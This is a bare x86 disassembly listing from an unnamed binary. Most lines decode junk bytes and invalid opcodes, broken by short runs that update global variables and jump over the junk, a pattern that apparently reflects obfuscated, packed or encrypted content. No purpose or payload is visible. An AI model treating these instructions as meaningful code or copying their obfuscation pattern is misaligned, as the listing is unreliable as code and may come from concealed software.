  4203a0:	cmp    DWORD PTR [edx-0x35],edi
  4203a3:	lock mov bh,0x63
  4203a6:	aam    0x63
  4203a8:	int    0x4e
  4203aa:	mov    ch,BYTE PTR [ebx-0xa]
  4203ad:	push   ecx
  4203ae:	dec    ebx
  4203af:	(bad)  
  4203b0:	stos   DWORD PTR es:[edi],eax
  4203b1:	cwde   
  4203b2:	mov    edi,0x796765a8
  4203b7:	out    dx,eax
  4203b8:	cmp    edi,DWORD PTR [edi-0x5f60e239]
  4203be:	pusha  
  4203bf:	stos   BYTE PTR es:[edi],al
  4203c0:	cmp    bl,BYTE PTR [ebx-0xf]
  4203c3:	jne    0x42041d
  4203c5:	or     BYTE PTR [esi],dh
  4203c7:	and    cl,al
  4203c9:	(bad)  
  4203ca:	ins    BYTE PTR es:[edi],dx
  4203cb:	mov    eax,ds:0xdbaecd01
  4203d0:	jb     0x420410
  4203d2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4203d3:	mov    eax,ds:0xe3f1f050
  4203d8:	jno    0x4203bf
  4203da:	shl    DWORD PTR [ebp+edx*8+0x53835d84],0xba
  4203e2:	setg   BYTE PTR [ecx]
  4203e5:	ins    DWORD PTR es:[edi],dx
  4203e6:	fild   DWORD PTR [esi]
  4203e8:	push   edi
  4203e9:	rol    BYTE PTR [ecx-0x4f0d3083],0x35
  4203f0:	rcr    BYTE PTR [esi+0x21771551],0x78
  4203f7:	test   eax,0xca251a40
  4203fc:	jmp    0x420380
  4203fe:	jmp    0x420414
  420400:	data16 jno 0x4203a2
  420403:	jnp    0x4203b7
  420405:	mov    ds:0x9f20855d,al
  42040a:	outs   dx,BYTE PTR ds:[esi]
  42040b:	pop    ds
  42040c:	xor    ecx,esi
  42040e:	cmp    DWORD PTR ds:0x4335c8,0x0
  420415:	jle    0x420436
  42041b:	movzx  ebx,BYTE PTR ds:0x4335c0
  420422:	and    DWORD PTR ds:0x433580,ebx
  420428:	jmp    0x420436
  42042d:	push   DWORD PTR [ebp-0x28]
  420430:	call   DWORD PTR ds:0x43c7cc
  420436:	add    eax,ecx
  420438:	lea    ecx,[ebp-0x48]
  42043b:	mov    DWORD PTR [ebp+eax*4+0x34a49b10],ecx
  420442:	mov    eax,DWORD PTR [ebp-0x90]
  420448:	mov    ecx,DWORD PTR [ebp-0x90]
  42044e:	sub    ebx,DWORD PTR ds:0x4335ac
  420454:	sub    eax,0x7511
  420459:	add    DWORD PTR ds:0x433610,ecx
  42045f:	mov    ebx,0x3cf87511
  420464:	sbb    DWORD PTR ds:0x43358c,0x3dbc
  42046e:	sub    ecx,ebx
  420470:	add    DWORD PTR ds:0x4335c4,0x66c
  42047a:	jmp    0x420548
  42047f:	jae    0x420450
  420481:	lahf   
  420482:	fistp  QWORD PTR [edi+0x47ef73df]
  420488:	adc    dl,BYTE PTR [ebx+0x3f]
  42048b:	nop
  42048c:	push   edi
  42048d:	add    DWORD PTR [esi+0x39],ecx
  420490:	jns    0x420493
  420492:	add    BYTE PTR [ecx-0x62000000],dh
  420498:	sub    ebx,DWORD PTR [edi-0x557c4769]
  42049e:	shr    edx,0x1a
  4204a1:	mov    cl,0xbc
  4204a3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4204a4:	lea    ecx,[eax+ebp*8-0x7409624e]
  4204ab:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4204ac:	and    bh,bh
  4204ae:	mov    ecx,0x1f353dea
  4204b3:	addr16 lock sbb al,0x2
  4204b8:	stc    
  4204b9:	hlt    
  4204ba:	neg    DWORD PTR [ebx-0x13926836]
  4204c0:	test   al,0x4
  4204c2:	mov    WORD PTR [ecx+0x5291e236],cs
  4204c8:	push   esi
  4204c9:	aad    0x4c
  4204cb:	stos   BYTE PTR es:[edi],al
  4204cc:	xlat   BYTE PTR ds:[ebx]
  4204cd:	(bad)  
  4204ce:	(bad)  
  4204cf:	repnz adc al,0x6c
  4204d2:	sbb    BYTE PTR [esi-0x6f16640b],cl
  4204d8:	xor    DWORD PTR [edx-0x57d0403e],esi
  4204de:	pop    edx
  4204df:	cld    
  4204e0:	cmp    BYTE PTR [eax],dl
  4204e2:	sbb    ax,dx
  4204e5:	sbb    eax,0x76db35
  4204ea:	pusha  
  4204eb:	xchg   edx,eax
  4204ec:	in     al,0x9b
  4204ee:	push   edx
  4204ef:	add    DWORD PTR [edi-0x78c38014],ebp
  4204f5:	add    eax,0x73c4da67
  4204fa:	cmp    BYTE PTR [ebx],0xbd
  4204fd:	push   eax
  4204fe:	(bad)  
  4204ff:	stos   DWORD PTR es:[edi],eax
  420500:	sbb    DWORD PTR [ebp+0x2c],ebx
  420503:	aas    
  420504:	das    
  420505:	dec    edi
  420506:	call   0x19e320c4
  42050b:	fdivr  QWORD PTR [eax]
  42050d:	pop    edx
  42050e:	repnz (bad) 
  420510:	out    dx,eax
  420511:	jno    0x42051d
  420513:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420514:	cmp    ecx,DWORD PTR [ebx+eiz*8]
  420517:	adc    DWORD PTR [edi-0x4d],0xffffffc7
  42051b:	pop    edi
  42051c:	sub    eax,0xb81574e1
  420521:	jp     0x420589
  420523:	pop    eax
  420524:	xchg   DWORD PTR ss:[ecx],edx
  420527:	call   0x3f805c5e
  42052c:	inc    eax
  42052d:	pop    ss
  42052e:	aad    0xfe
  420530:	push   ecx
  420531:	(bad)  
  420532:	dec    edx
  420533:	imul   ecx,esi,0x13
  420536:	idiv   DWORD PTR [ebp+0x68]
  420539:	cmp    dh,BYTE PTR [esi]
  42053b:	leave  
  42053c:	sbb    eax,0xa7fb4553
  420541:	mov    dh,0xa8
  420543:	stos   DWORD PTR es:[edi],eax
  420544:	xchg   esp,eax
  420545:	leave  
  420546:	cli    
  420547:	xor    BYTE PTR ds:0x59c9,0x81
  42054e:	icebp  
  42054f:	add    BYTE PTR [eax],al
  420551:	loop   0x4205cb
  420553:	and    DWORD PTR ds:0x4335e4,0x5776
  42055d:	shl    eax,0x10
  420560:	jmp    0x42062e
  420565:	cmp    DWORD PTR ds:0xddfdcd6d,0x1e187da1
  42056f:	mov    dh,BYTE PTR [ebx]
  420571:	test   BYTE PTR [esi+0x79ea1c3c],ch
  420577:	add    DWORD PTR [eax],eax
  420579:	mov    cl,0x0
  42057b:	add    BYTE PTR [eax],al
  42057d:	sar    BYTE PTR [ecx-0x58],1
  420580:	mov    ebx,edx
  420582:	daa    
  420583:	push   eax
  420584:	cmp    ch,0x30
  420587:	in     al,0xab
  420589:	cwde   
  42058a:	push   0xaed52eea
  42058f:	mov    dl,0x38
  420591:	cwde   
  420592:	lods   al,BYTE PTR ds:[esi]
  420593:	add    al,0x44
  420595:	sti    
  420596:	ret    0x3886
  420599:	add    DWORD PTR [ebx+eiz*4-0x48],0x8f055e47
  4205a1:	xchg   esp,eax
  4205a2:	mov    esp,0x9e39eac4
  4205a7:	sub    bh,BYTE PTR [eax-0x53ffb08a]
  4205ad:	add    eax,0xe7d42b03
  4205b2:	les    ecx,FWORD PTR [ebx-0x9]
  4205b5:	and    eax,0xaa2efa18
  4205ba:	js     0x42059f
  4205bc:	ret    0x49a3
  4205bf:	sbb    BYTE PTR [ecx-0x5069d7a1],bl
  4205c5:	push   esi
  4205c6:	aas    
  4205c7:	imul   ebx,DWORD PTR [esi+eiz*4-0x52],0xdd12f639
  4205cf:	cwde   
  4205d0:	ret    
  4205d1:	and    BYTE PTR [edx-0x456fe8d7],ch
  4205d7:	push   0x66
  4205d9:	mov    bl,0xf1
  4205db:	pop    ss
  4205dc:	cwde   
  4205dd:	jns    0x420562
  4205df:	mov    edx,0xaac09f57
  4205e4:	ret    0x123e
  4205e7:	cmp    ecx,DWORD PTR [esi]
  4205e9:	push   edx
  4205ea:	dec    ebp
  4205eb:	push   0xffffffe5
  4205ed:	or     al,BYTE PTR [ebp+0x11524a8e]
  4205f3:	push   ds
  4205f4:	mov    ebx,0x200a4b2a
  4205f9:	loop   0x420659
  4205fb:	imul   ecx,edx,0xffffffab
  4205fe:	jmp    0x25dabd19
  420603:	test   BYTE PTR [ecx+0x73],0xbb
  420607:	push   esi
  420608:	out    dx,eax
  420609:	outs   dx,BYTE PTR ds:[esi]
  42060a:	add    ebp,0x2f
  42060d:	jbe    0x420655
  42060f:	lock pop ebp
  420611:	mov    edx,0x380f8c60
  420616:	jecxz  0x420679
  420618:	es pop edx
  42061a:	xchg   edx,eax
  42061b:	jnp    0x420695
  42061d:	pop    esp
  42061e:	fcomp  DWORD PTR [edx-0x58d2a373]
  420624:	mov    BYTE PTR es:[esi+0xf],cl
  420628:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420629:	arpl   WORD PTR [ebx+0x6e],sp
  42062c:	loop   0x4205cd
  42062e:	shr    ecx,0x10
  420631:	or     ecx,eax
  420633:	mov    DWORD PTR ds:0x433570,0x7a5d
  42063d:	sub    ecx,ebx
  42063f:	xor    DWORD PTR ds:0x433640,0x5f61
  420649:	jmp    0x420717
  42064e:	xchg   dh,dl
  420650:	call   FWORD PTR [ebx]
  420652:	(bad)  
  420653:	cmp    esp,esi
  420655:	fistp  WORD PTR [esi-0x68]
  420658:	push   ecx
  420659:	dec    esi
  42065a:	cmp    BYTE PTR [edi+0x7a9b5fd9],ch
  420660:	add    DWORD PTR [eax],eax
  420662:	mov    cl,0x0
  420664:	add    BYTE PTR [eax],al
  420666:	sbb    BYTE PTR [edi],cl
  420668:	adc    eax,0x9e8fc1e
  42066d:	fbstp  TBYTE PTR [eax-0x75fde59f]
  420673:	xchg   DWORD PTR [ecx+ebp*2],esp
  420676:	and    esp,DWORD PTR [ebx-0x70807f38]
  42067c:	jno    0x420623
  42067e:	test   eax,0x97f83d7b
  420683:	or     ch,BYTE PTR [edi-0x38]
  420686:	push   edx
  420687:	idiv   BYTE PTR es:[esi]
  42068a:	ds and bh,bl
  42068d:	pop    edi
  42068e:	mov    dh,0x94
  420690:	xchg   ecx,eax
  420691:	adc    BYTE PTR [ebp+0x6f5f718e],ah
  420697:	aas    
  420698:	call   0x561497cf
  42069d:	xchg   edx,eax
  42069e:	mov    eax,ds:0x13c64302
  4206a3:	ds es fs jp 0x420706
  4206a8:	arpl   bp,bp
  4206aa:	pop    edx
  4206ab:	daa    
  4206ac:	xchg   edi,eax
  4206ad:	loop   0x42065d
  4206af:	cld    
  4206b0:	and    bh,BYTE PTR [esp+esi*4+0xb4e402b]
  4206b7:	sbb    ah,BYTE PTR [ebp-0x63]
  4206ba:	mov    al,ds:0xd6575f09
  4206bf:	call   0x54fa3eb9
  4206c4:	push   ecx
  4206c5:	stos   DWORD PTR es:[edi],eax
  4206c6:	pop    esp
  4206c7:	arpl   WORD PTR [ebx],si
  4206c9:	or     esp,ebx
  4206cb:	out    0xda,al
  4206cd:	sar    DWORD PTR [ebx],0xb6
  4206d0:	into   
  4206d1:	outs   dx,BYTE PTR ds:[esi]
  4206d2:	cmp    BYTE PTR [edi+eiz*4+0x30],0xfe
  4206d7:	or     edi,DWORD PTR [ecx-0x5fca303e]
  4206dd:	mov    edi,0xb10b9651
  4206e2:	jns    0x420751
  4206e4:	pop    ss
  4206e5:	clc    
  4206e6:	gs in  eax,0x55
  4206e9:	cdq    
  4206ea:	push   ebx
  4206eb:	cmp    esi,esi
  4206ed:	call   0x8f53:0x892c1068
  4206f4:	sbb    DWORD PTR [eax+0x5c],edx
  4206f7:	xchg   ebp,eax
  4206f8:	or     esi,edx
  4206fa:	hlt    
  4206fb:	int    0xbd
  4206fd:	adc    cl,BYTE PTR [ecx]
  4206ff:	ret    0x80b2
  420702:	test   BYTE PTR [ebp+0x7],bh
  420705:	sub    eax,esp
  420707:	adc    DWORD PTR ds:0xf9c937a0,ecx
  42070d:	int    0xc6
  42070f:	loopne 0x4206cb
  420711:	leave  
  420712:	dec    edx
  420713:	div    BYTE PTR [ebx-0x7a725910]
  420719:	jo     0x42071a
  42071b:	(bad)  
  42071c:	(bad)  
  42071d:	jmp    0x4207eb
  420722:	or     dh,BYTE PTR [ecx]
  420724:	cmp    bh,ah
  420726:	cmp    edi,edi
  420728:	into   
  420729:	test   DWORD PTR [ebp+0x6ba155d0],0x4c922615
  420733:	jnp    0x420736
  420735:	add    BYTE PTR [ecx-0x70000000],dh
  42073b:	add    ch,bh
  42073d:	aas    
  42073e:	cmp    eax,0xe247f798
  420743:	pop    ecx
  420744:	xchg   edx,eax
  420745:	cmp    cl,BYTE PTR [ecx+0x5c]
  420748:	lock xor DWORD PTR [ebp-0x60],0xffffffd3
  42074d:	dec    eax
  42074e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42074f:	and    DWORD PTR [eax-0x778acf5d],eax
  420755:	outs   dx,BYTE PTR ds:[esi]
  420756:	mov    ds:0x2d5517ec,eax
  42075b:	sub    DWORD PTR [esi],ebp
  42075d:	enter  0xe1ea,0xef
  420761:	push   ebx
  420762:	inc    edi
  420763:	and    al,0xa0
  420765:	into   
  420766:	int    0xd5
  420768:	sahf   
  420769:	push   ebp
  42076a:	popa   
  42076b:	pop    ds
  42076c:	inc    ebx
  42076d:	inc    ebx
  42076e:	fidivr WORD PTR [esi+0x11]
  420771:	push   cs
  420772:	jle    0x42075d
  420774:	push   0x6571d43b
  420779:	mov    dh,bh
  42077b:	push   esp
  42077c:	pusha  
  42077d:	jnp    0x42071f
  42077f:	adc    dh,BYTE PTR [ecx]
  420781:	mov    ch,0x19
  420783:	aaa    
  420784:	mov    dl,0x75
  420786:	or     ebp,DWORD PTR ds:0xcf69794f
  42078c:	xlat   BYTE PTR ds:[ebx]
  42078d:	adc    esp,ecx
  42078f:	in     eax,dx
  420790:	mov    bl,al
  420792:	jmp    0x11408ff0
  420797:	dec    DWORD PTR [eax+0x5cc2d45f]
  42079d:	pop    ebx
  42079e:	push   ecx
  42079f:	add    al,0x52
  4207a1:	repnz inc ebx
  4207a3:	loopne 0x420752
  4207a5:	pop    es
  4207a6:	sbb    ch,ch
  4207a8:	pop    ds
  4207a9:	xchg   ecx,eax
  4207aa:	jp     0x42081e
  4207ac:	imul   esp,DWORD PTR [ebx-0x56],0x405f848
  4207b3:	xor    esi,edi
  4207b5:	xor    al,0xa2
  4207b7:	or     ebp,DWORD PTR [edi-0x55]
  4207ba:	popf   
  4207bb:	or     BYTE PTR [edi-0x64772929],al
  4207c1:	push   edx
  4207c2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4207c3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4207c4:	fimul  DWORD PTR [edi]
  4207c6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4207c7:	adc    ecx,DWORD PTR [esi]
  4207c9:	jle    0x420829
  4207cb:	xor    eax,0x1284a781
  4207d0:	adc    cl,cl
  4207d2:	enter  0x3226,0x54
  4207d6:	imul   eax,eax,0xe38b4e2c
  4207dc:	sar    eax,0x2d
  4207df:	cmc    
  4207e0:	addr16 out dx,al
  4207e2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4207e3:	jmp    0xb31ec3d3
  4207e8:	cmp    eax,0xa150a404
  4207ed:	in     al,dx
  4207ee:	ss inc ebx
  4207f0:	add    BYTE PTR [ebx+0x48050900],cl
  4207f6:	ss inc ebx
  4207f8:	add    cl,ch
  4207fa:	leave  
  4207fb:	add    BYTE PTR [eax],al
  4207fd:	add    BYTE PTR [edx],bl
  4207ff:	jo     0x4207cb
  420801:	inc    esp
  420802:	jmp    0x33f5:0xcb7e9efe
  420809:	imul   edx,edx,0xfd5f56a3
  42080f:	jnp    0x420812
  420811:	add    BYTE PTR [ecx-0x78000000],dh
  420817:	push   ecx
  420818:	xchg   esi,eax
  420819:	jne    0x420828
  42081b:	pop    edi
  42081c:	xlat   BYTE PTR ds:[ebx]
  42081d:	xchg   esi,eax
  42081e:	sbb    ah,BYTE PTR [esi]
  420820:	mov    ds:0x4a141429,eax
  420825:	xchg   edx,eax
  420826:	aas    
  420827:	jo     0x42089c
  420829:	sar    DWORD PTR [edi+0x6d],0x44
  42082d:	ffree  st(7)
  42082f:	test   edi,edi
  420831:	mov    bh,0x7c
  420833:	lods   eax,DWORD PTR ds:[esi]
  420834:	dec    ebp
  420835:	mov    dl,0xb7
  420837:	or     al,BYTE PTR [edi+eax*2+0x5690fb0b]
  42083e:	sub    esp,edx
  420840:	data16 stos BYTE PTR es:[edi],al
  420842:	pop    ds
  420843:	outs   dx,DWORD PTR ds:[esi]
  420844:	outs   dx,DWORD PTR ds:[esi]
  420845:	sbb    BYTE PTR [eax],0x3c
  420848:	int3   
  420849:	dec    eax
  42084a:	mov    eax,0xedeb61c0
  42084f:	xor    al,0xef
  420851:	xchg   ch,dl
  420853:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420854:	push   0x44406c4b
  420859:	sbb    al,0x2
  42085b:	lea    ebx,[ecx+esi*4]
  42085e:	jle    0x420882
  420860:	leave  
  420861:	mov    dh,0xee
  420863:	mov    ch,0x84
  420865:	(bad)
  420868:	pop    ecx
  420869:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42086a:	pop    esi
  42086b:	mov    edi,DWORD PTR [ecx+0x62]
  42086e:	dec    ebx
  42086f:	push   0x73bb90a3
  420874:	adc    BYTE PTR [eax+eiz*1-0x53d10531],0x43
  42087c:	aas    
  42087d:	setp   ch
  420880:	cmp    ebx,DWORD PTR [ebx-0x35b31c36]
  420886:	test   eax,0x7c0f70a7
  42088b:	xor    eax,0x95e89793
  420890:	push   es
  420891:	mov    esi,0x27fcb162
  420896:	retf   0x1f23
  420899:	in     al,0xf3
  42089b:	dec    edx
  42089c:	jle    0x420870
  42089e:	mov    bh,0x85
  4208a0:	push   ss
  4208a1:	jno    0x420825
  4208a3:	or     bh,bl
  4208a5:	in     eax,0x5
  4208a7:	test   DWORD PTR gs:[esi],0x31359496
  4208ae:	js     0x4208dc
  4208b0:	(bad)  
  4208b1:	imul   BYTE PTR [ecx-0x5b]
  4208b4:	int3   
  4208b5:	inc    esi
  4208b6:	stos   DWORD PTR es:[edi],eax
  4208b7:	jge    0x4208b9
  4208b9:	dec    ecx
  4208ba:	addr16 out dx,al
  4208bc:	xor    cl,cl
  4208be:	retf   0x7840
  4208c1:	daa    
  4208c2:	dec    ebx
  4208c3:	rcr    BYTE PTR [ecx+0x1],cl
  4208c6:	pushf  
  4208c7:	mov    DWORD PTR [ebp-0x90],ecx
  4208cd:	xor    DWORD PTR ds:0x433568,0x510
  4208d7:	mov    eax,DWORD PTR [ebp+0x10]
  4208da:	xor    ecx,ecx
  4208dc:	or     ecx,DWORD PTR ds:0x4335a8
  4208e2:	sbb    DWORD PTR ds:0x433630,ecx
  4208e8:	mov    ecx,DWORD PTR [ebp+0x14]
  4208eb:	and    DWORD PTR ds:0x4335d0,0x433620
  4208f5:	xor    eax,esi
  4208f7:	jmp    0x4209c5
  4208fc:	inc    edi
  4208fd:	pop    esi
  4208fe:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4208ff:	xor    DWORD PTR [ebp-0x28812805],edi
  420905:	mov    ebp,0x7be5950f
  42090a:	add    al,0x67
  42090c:	scas   al,BYTE PTR es:[edi]
  42090d:	jl     0x420910
  42090f:	add    BYTE PTR [ecx+0x1b000000],dh
  420915:	cmp    eax,0x17bbc235
  42091a:	(bad)  
  42091b:	fadd   st,st(1)
  42091d:	ds jle 0x42099c
  420920:	lods   eax,DWORD PTR ds:[esi]
  420921:	jns    0x4208da
  420923:	adc    al,0xef
  420925:	cmp    cl,al
  420927:	jmp    0xa52b:0x4ee2cc52
  42092e:	daa    
  42092f:	data16 xor BYTE PTR [ebx+0x7b0473e1],ah
  420936:	shl    DWORD PTR [ecx-0x20],0xd1
  42093a:	daa    
  42093b:	xchg   esi,eax
  42093c:	jle    0x420982
  42093e:	lods   al,BYTE PTR ds:[esi]
  42093f:	dec    ebp
  420940:	jmp    0x4208e8
  420942:	cld    
  420943:	push   esp
  420944:	pop    ecx
  420945:	push   cs
  420946:	pusha  
  420947:	or     eax,0xa966fd94
  42094c:	cmp    DWORD PTR [ebx-0x66],esi
  42094f:	retf   
  420950:	pop    eax
  420951:	loopne 0x42099e
  420953:	jns    0x42098f
  420955:	shr    BYTE PTR [esi-0x13f3df53],cl
  42095b:	(bad)  
  42095c:	(bad)  
  42095d:	sti    
  42095e:	test   eax,0x7f02e256
  420963:	fs inc eax
  420965:	mov    ebx,0x33fa53f5
  42096a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42096b:	(bad)  
  42096c:	sub    esp,DWORD PTR [ecx]
  42096e:	adc    al,0xa3
  420970:	es or  dh,dl
  420973:	pusha  
  420974:	popa   
  420975:	fucomp st(1)
  420977:	or     al,0xdf
  420979:	aaa    
  42097a:	lods   al,BYTE PTR ds:[esi]
  42097b:	xlat   BYTE PTR ds:[ebx]
  42097c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42097d:	shr    BYTE PTR [ebx+edx*8],1
  420980:	iret   
  420981:	mov    dl,0x16
  420983:	(bad)  
  420984:	jecxz  0x4209aa
  420986:	fisttp DWORD PTR [ebp+0x517a557f]
  42098c:	leave  
  42098d:	test   DWORD PTR [eax],eax
  42098f:	pushf  
  420990:	mov    ch,0xa2
  420992:	fldenv [eax-0x5cda157d]
  420998:	mov    ss,WORD PTR [ebp+0x4e863828]
  42099e:	push   es
  42099f:	cmp    al,BYTE PTR [eax]
  4209a1:	neg    DWORD PTR [esi]
  4209a3:	jp     0x420a21
  4209a5:	in     eax,0xc
  4209a7:	jae    0x42093b
  4209a9:	ins    BYTE PTR es:[edi],dx
  4209aa:	xor    DWORD PTR [edx-0x3b],esi
  4209ad:	leave  
  4209ae:	xor    BYTE PTR [eax],dh
  4209b0:	fstp   DWORD PTR [ebx]
  4209b2:	setge  BYTE PTR [ecx+0x4a]
  4209b6:	out    dx,eax
  4209b7:	int    0x11
  4209b9:	mov    ah,0x2f
  4209bb:	loopne 0x4209c7
  4209bd:	(bad)  
  4209be:	mov    edx,0xa3149ba3
  4209c3:	mov    ebp,0xe9c72bad
  4209c8:	leave  
  4209c9:	add    BYTE PTR [eax],al
  4209cb:	add    al,ah
  4209cd:	stc    
  4209ce:	push   edx
  4209cf:	ficomp DWORD PTR [ebx-0x5]
  4209d2:	call   0x2822e4d2
  4209d7:	lahf   
  4209d8:	cld    
  4209d9:	sbb    eax,0x7d5f5f7f
  4209de:	add    DWORD PTR [eax],eax
  4209e0:	mov    cl,0x0
  4209e2:	add    BYTE PTR [eax],al
  4209e4:	xor    eax,0xed55e269
  4209e9:	bound  esi,QWORD PTR ss:[esi]
  4209ec:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4209ed:	add    eax,0x96765391
  4209f2:	and    eax,0x91b7e07d
  4209f7:	enter  0x22fb,0x83
  4209fb:	scas   eax,DWORD PTR es:[edi]
  4209fc:	and    ebx,ebx
  4209fe:	xchg   edx,eax
  4209ff:	aaa    
  420a00:	sub    al,0xbb
  420a02:	xor    DWORD PTR [ecx+0x7b9fd47],ecx
  420a08:	clc    
  420a09:	mov    eax,ds:0xf7afdd2e
  420a0e:	pop    edx
  420a0f:	enter  0xaed,0xf
  420a13:	adc    DWORD PTR [ebp-0x2fedbe2e],0x1e
  420a1a:	lods   eax,DWORD PTR ds:[esi]
  420a1b:	jae    0x420a29
  420a1d:	cmp    eax,0x3dcdc274
  420a22:	xchg   edi,eax
  420a23:	xor    dl,BYTE PTR [edx+eax*4]
  420a26:	int3   
  420a27:	mov    WORD PTR [ecx],?
  420a29:	push   ebx
  420a2a:	lea    ecx,[di]
  420a2d:	(bad)  
  420a2e:	adc    eax,0x27cb6564
  420a33:	cmp    al,0x3
  420a35:	dec    ebp
  420a36:	rol    DWORD PTR [ebp+0x2ccde29a],cl
  420a3c:	pop    edi
  420a3d:	pop    edi
  420a3e:	ds mov esp,0x4167f0d5
  420a44:	push   edx
  420a45:	ds mov al,0x74
  420a48:	ins    BYTE PTR es:[edi],dx
  420a49:	push   edx
  420a4a:	push   ds
  420a4b:	fsubr  st,st(1)
  420a4d:	cmp    bl,dl
  420a4f:	adc    DWORD PTR [ecx+0x27],ecx
  420a52:	mov    ds:0x1f6ad943,al
  420a57:	pushf  
  420a58:	adc    al,0x59
  420a5a:	cmp    eax,0x8bfa6099
  420a5f:	out    dx,al
  420a60:	sbb    DWORD PTR [ebp-0x7b],ebx
  420a63:	div    BYTE PTR ds:0x9ac754ab
  420a69:	loopne 0x420ab4
  420a6b:	xor    esp,DWORD PTR [esi-0xfc93b94]
  420a71:	fld    DWORD PTR [ebx-0x4c]
  420a74:	iret   
  420a75:	test   al,ch
  420a77:	stos   BYTE PTR es:[edi],al
  420a78:	sahf   
  420a79:	or     al,dh
  420a7b:	out    0x33,eax
  420a7d:	push   es
  420a7e:	lock div DWORD PTR [ebp+0x3b]
  420a82:	test   ebp,edi
  420a84:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420a85:	or     DWORD PTR [ebx+0x7e],esi
  420a88:	mov    al,0x75
  420a8a:	lods   al,BYTE PTR ds:[esi]
  420a8b:	ins    BYTE PTR es:[edi],dx
  420a8c:	test   al,0x87
  420a8e:	add    BYTE PTR [ecx+0x5a71cf00],dh
  420a94:	rcl    DWORD PTR [eax-0x5f],1
  420a97:	aam    0x31
  420a99:	inc    ebx
  420a9a:	add    BYTE PTR [eax+0x2a],ch
  420a9d:	xor    DWORD PTR [ebx+0x0],eax
  420aa0:	and    DWORD PTR ds:0x4335a0,0x433560
  420aaa:	push   DWORD PTR [eax]
  420aac:	sub    DWORD PTR ds:0x433554,0x7d62
  420ab6:	jmp    0x420b84
  420abb:	sbb    edi,DWORD PTR [edx-0x170c9fae]
  420ac1:	cmp    edi,ebx
  420ac3:	icebp  
  420ac4:	inc    ebp
  420ac5:	or     BYTE PTR [ebx],dh
  420ac7:	es js  0x420b16
  420aca:	sbb    al,0x10
  420acc:	jle    0x420acf
  420ace:	add    BYTE PTR [ecx+0x3c000000],dh
  420ad4:	cmp    bh,BYTE PTR [ecx-0x75]
  420ad7:	mov    edi,0xc873df03
  420adc:	mov    ds:0xa7fd55b4,al
  420ae1:	or     eax,0x3154af18
  420ae6:	pop    ds
  420ae7:	push   edi
  420ae8:	inc    ebx
  420ae9:	cmp    eax,0x8d477e78
  420aee:	adc    esi,DWORD PTR [edx+0x2b]
  420af1:	shl    dh,0x61
  420af4:	inc    eax
  420af5:	and    bl,dl
  420af7:	adc    BYTE PTR [ecx],ch
  420af9:	xchg   edi,eax
  420afa:	sub    esp,ebp
  420afc:	loopne 0x420b26
  420afe:	test   al,0x44
  420b00:	mov    al,0xe9
  420b02:	xor    ebp,0xd7ae1d7e
  420b08:	inc    edi
  420b09:	std    
  420b0a:	iret   
  420b0b:	scas   eax,DWORD PTR es:[edi]
  420b0c:	lahf   
  420b0d:	mov    dh,0x65
  420b0f:	not    BYTE PTR [edx]
  420b11:	div    BYTE PTR [ebx]
  420b13:	adc    BYTE PTR [eax-0x1dcff01e],bh
  420b19:	inc    eax
  420b1a:	test   eax,0xbc650fac
  420b1f:	test   eax,0x9c3d73c2
  420b24:	push   ebp
  420b25:	cmp    ebp,esi
  420b27:	std    
  420b28:	dec    ecx
  420b29:	pop    esp
  420b2a:	pop    ecx
  420b2b:	arpl   ax,sp
  420b2d:	jmp    0xdda2:0xca82b18a
  420b34:	push   ecx
  420b35:	push   cs
  420b36:	leave  
  420b37:	rcl    DWORD PTR [edi-0x3e],cl
  420b3a:	es mov ecx,0xdad1a716
  420b40:	sub    dl,BYTE PTR [edi+0x47]
  420b43:	and    cl,BYTE PTR [esi+ebp*8-0x72]
  420b47:	sti    
  420b48:	sbb    al,0x97
  420b4a:	call   0xb203:0x56b49d16
  420b51:	mov    bl,0xc6
  420b53:	inc    ecx
  420b54:	xchg   ebx,eax
  420b55:	xchg   edi,eax
  420b56:	loopne 0x420b11
  420b58:	fld    DWORD PTR [edx+0xe7a7dc]
  420b5e:	push   ds
  420b5f:	add    BYTE PTR [edi],ah
  420b61:	fcom   DWORD PTR [edx]
  420b63:	and    ch,cl
  420b65:	push   esi
  420b66:	icebp  
  420b67:	mov    BYTE PTR [edi-0x41f9617],dh
  420b6d:	leave  
  420b6e:	jg     0x420b9b
  420b70:	retf   
  420b71:	leave  
  420b72:	les    edx,FWORD PTR [ecx+0x71]
  420b75:	mov    edi,ebp
  420b77:	dec    edi
  420b78:	dec    esi
  420b79:	xchg   ebp,eax
  420b7a:	jno    0x420b86
  420b7c:	or     eax,0x4f869e8f
  420b81:	xchg   edi,eax
  420b82:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420b83:	(bad)  
  420b84:	call   0x40d6b3
  420b89:	adc    eax,ecx
  420b8b:	mov    eax,DWORD PTR [ebp-0x1c]
  420b8e:	cmp    DWORD PTR ds:0x433550,0x0
  420b95:	jb     0x420bb0
  420b9b:	jmp    0x420bb0
  420ba0:	push   0x433544
  420ba5:	push   0x8163
  420baa:	call   DWORD PTR ds:0x43c804
  420bb0:	mov    ecx,DWORD PTR [ebp-0x10]
  420bb3:	mov    DWORD PTR [ebp-0x10],ecx
  420bb6:	jmp    0x420c84
  420bbb:	ins    DWORD PTR es:[edi],dx
  420bbc:	shr    BYTE PTR [eax+0x37],0xed
  420bc0:	mov    edi,0xa49dda7f
  420bc5:	pop    ecx
  420bc6:	pop    edi
  420bc7:	mov    edx,0xc15f915a
  420bcc:	jle    0x420bcf
  420bce:	add    BYTE PTR [ecx-0x72000000],dh
  420bd4:	mov    bl,0x3a
  420bd6:	and    eax,0xe7028117
  420bdb:	outs   dx,DWORD PTR ds:[esi]
